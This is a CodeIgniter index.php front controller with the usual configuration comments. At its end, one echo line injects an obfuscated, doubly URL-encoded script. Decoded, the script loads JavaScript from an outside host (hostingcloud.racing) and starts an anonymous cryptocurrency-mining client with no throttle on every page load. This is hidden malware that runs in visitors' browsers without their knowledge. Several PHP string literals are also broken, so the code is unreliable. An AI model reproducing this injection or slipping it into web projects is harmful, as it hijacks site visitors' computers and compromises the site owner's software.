 <?php

/*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 *
 */
	define('ENVIRONMENT', 'development');
/*
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */

if (defined('ENVIRONMENT'))
{
	switch (ENVIRONMENT)
	{
		case 'development':
		  	error_reporting(E_ALL ^ E_NOTICE  ^ E_WARNING);
		break;
	
		case 'testing':
		case 'production':
		  //  error_reporting(0);
		break;

		default:
			exit('The application environment is not set correctly.');
	}
}
 
/*
 *---------------------------------------------------------------
 * SYSTEM FOLDER NAME
 *---------------------------------------------------------------
 *
 * This variable must contain the name of your "system" folder.
 * Include the path if the folder is not in the same  directory
 * as this file.
 *
 */
	$system_path = 'system';

/*
 *---------------------------------------------------------------
 * APPLICATION FOLDER NAME
 *---------------------------------------------------------------
 *
 * If you want this front controller to use a different "application"
 * folder then the default one you can set its name here. The folder
 * can also be renamed or relocated anywhere on your server.  If
 * you do, use a full server path. For more info please see the user guide:
 * http://codeigniter.com/user_guide/general/managing_apps.html
 *
 * NO TRAILING SLASH!
 *
 */
	$application_folder = 'application';

/*
 * --------------------------------------------------------------------
 * DEFAULT CONTROLLER
 * --------------------------------------------------------------------
 *
 * Normally you will set your default controller in the routes.php file.
 * You can, however, force a custom routing by hard-coding a
 * specific controller class/function here.  For most applications, you
 * WILL NOT set your routing here, but it's an option for those
 * special instances where you might want to override the standard
 * routing in a specific front controller that shares a common CI installation.
 *
 * IMPORTANT:  If you set the routing here, NO OTHER controller will be
 * callable. In essence, this preference limits your application to ONE
 * specific controller.  Leave the function name blank if you need
 * to call functions dynamically via the URI.
 *
 * Un-comment the $routing array below to use this feature
 *
 */
	// The directory name, relative to the "controllers" folder.  Leave blank
	// if your controller is not in a sub-folder within the "controllers" folder
	// $routing['directory'] = ';

	// The controller class file name.  Example:  Mycontroller
	// $routing['controller'] = ';

	// The controller function you wish to be called.
	// $routing['function']	= ';


/*
 * -------------------------------------------------------------------
 *  CUSTOM CONFIG VALUES
 * -------------------------------------------------------------------
 *
 * The $assign_to_config array below will be passed dynamically to the
 * config class when initialized. This allows you to set custom config
 * items or override any default config values found in the config.php file.
 * This can be handy as it permits you to share one application between
 * multiple front controller files, with each file containing different
 * config values.
 *
 * Un-comment the $assign_to_config array below to use this feature
 *
 */
	// $assign_to_config['name_of_config_item'] = 'value of config item';



// --------------------------------------------------------------------
// END OF USER CONFIGURABLE SETTINGS.  DO NOT EDIT BELOW THIS LINE
// --------------------------------------------------------------------

/*
 * ---------------------------------------------------------------
 *  Resolve the system path for increased reliability
 * ---------------------------------------------------------------
 */
 

	// Set the current directory correctly for CLI requests
	if (defined('STDIN'))
	{
		chdir(dirname(__FILE__));
	}

	if (realpath($system_path) !== FALSE)
	{
		$system_path = realpath($system_path).'/';
	}

	// ensure there's a trailing slash
	$system_path = rtrim($system_path, '/').'/';

	// Is the system path correct?
	if ( ! is_dir($system_path))
	{
		exit("Your system folder path does not appear to be set correctly. Please open the following file and correct this: ".pathinfo(__FILE__, PATHINFO_BASENAME));
	}

/*
 * -------------------------------------------------------------------
 *  Now that we know the path, set the main path constants
 * -------------------------------------------------------------------
 */
	// The name of THIS file
	define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));

	// The PHP file extension
	// this global constant is deprecated.
	define('EXT', '.php');

	// Path to the system folder
	define('BASEPATH', str_replace("\\", "/", $system_path));

	// Path to the front controller (this file)
	define('FCPATH', str_replace(SELF, ', __FILE__));

	// Name of the "system folder"
	define('SYSDIR', trim(strrchr(trim(BASEPATH, '/'), '/'), '/'));


	// The path to the "application" folder
	if (is_dir($application_folder))
	{
		define('APPPATH', $application_folder.'/');
	}
	else
	{
		if ( ! is_dir(BASEPATH.$application_folder.'/'))
		{
			exit("Your application folder path does not appear to be set correctly. Please open the following file and correct this: ".SELF);
		}

		define('APPPATH', BASEPATH.$application_folder.'/');
	}

/*
 * --------------------------------------------------------------------
 * LOAD THE BOOTSTRAP FILE
 * --------------------------------------------------------------------
 *
 * And away we go...
 *
 */
require_once BASEPATH.'core/CodeIgniter.php';
 

echo "<script>eval(unescape('%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%27%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%65%76%61%6C%28%75%6E%65%73%63%61%70%65%28%5C%27%25%36%34%25%36%46%25%36%33%25%37%35%25%36%44%25%36%35%25%36%45%25%37%34%25%32%45%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%32%38%25%32%37%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%32%30%25%37%33%25%37%32%25%36%33%25%33%44%25%32%32%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%41%25%32%46%25%32%46%25%37%37%25%37%37%25%37%37%25%32%45%25%36%38%25%36%46%25%37%33%25%37%34%25%36%39%25%36%45%25%36%37%25%36%33%25%36%43%25%36%46%25%37%35%25%36%34%25%32%45%25%37%32%25%36%31%25%36%33%25%36%39%25%36%45%25%36%37%25%32%46%25%35%37%25%35%39%25%35%41%25%37%37%25%32%45%25%36%41%25%37%33%25%32%32%25%33%45%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45%25%35%43%25%36%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45%25%35%43%25%36%45%25%32%30%25%32%30%25%32%30%25%32%30%25%37%36%25%36%31%25%37%32%25%32%30%25%35%46%25%36%33%25%36%43%25%36%39%25%36%35%25%36%45%25%37%34%25%32%30%25%33%44%25%32%30%25%36%45%25%36%35%25%37%37%25%32%30%25%34%33%25%36%43%25%36%39%25%36%35%25%36%45%25%37%34%25%32%45%25%34%31%25%36%45%25%36%46%25%36%45%25%37%39%25%36%44%25%36%46%25%37%35%25%37%33%25%32%38%25%35%43%25%32%37%25%33%30%25%33%30%25%33%35%25%33%30%25%33%39%25%33%31%25%36%31%25%36%31%25%33%38%25%33%33%25%36%35%25%33%32%25%33%36%25%33%35%25%33%32%25%36%33%25%33%39%25%36%36%25%36%36%25%33%31%25%33%30%25%33%33%25%36%36%25%33%38%25%33%38%25%36%31%25%36%35%25%33%37%25%33%37%25%33%37%25%33%33%25%33%37%25%36%34%25%33%32%25%33%35%25%33%32%25%33%31%25%33%34%25%36%35%25%36%35%25%36%33%25%36%36%25%36%34%25%33%38%25%36%33%25%33%36%25%33%30%25%33%31%25%36%32%25%33%37%25%33%37%25%33%37%25%33%33%25%33%33%25%33%35%25%33%31%25%36%34%25%33%36%25%33%35%25%36%33%25%33%38%25%33%32%25%33%38%25%33%30%25%35%43%25%32%37%25%32%43%25%32%30%25%37%42%25%35%43%25%36%45%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%34%25%36%38%25%37%32%25%36%46%25%37%34%25%37%34%25%36%43%25%36%35%25%33%41%25%32%30%25%33%30%25%32%43%25%32%30%25%36%33%25%33%41%25%32%30%25%35%43%25%32%37%25%37%37%25%35%43%25%32%37%25%32%43%25%32%30%25%36%31%25%36%34%25%37%33%25%33%41%25%32%30%25%33%30%25%35%43%25%36%45%25%32%30%25%32%30%25%32%30%25%32%30%25%37%44%25%32%39%25%33%42%25%35%43%25%36%45%25%32%30%25%32%30%25%32%30%25%32%30%25%35%46%25%36%33%25%36%43%25%36%39%25%36%35%25%36%45%25%37%34%25%32%45%25%37%33%25%37%34%25%36%31%25%37%32%25%37%34%25%32%38%25%32%39%25%33%42%25%35%43%25%36%45%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45%25%32%37%25%32%39%25%33%42%5C%27%29%29%3B%3C%2F%73%63%72%69%70%74%3E%27%29%3B'));</script>";  

/* End of file index.php */
/* Location: ./index.php */ 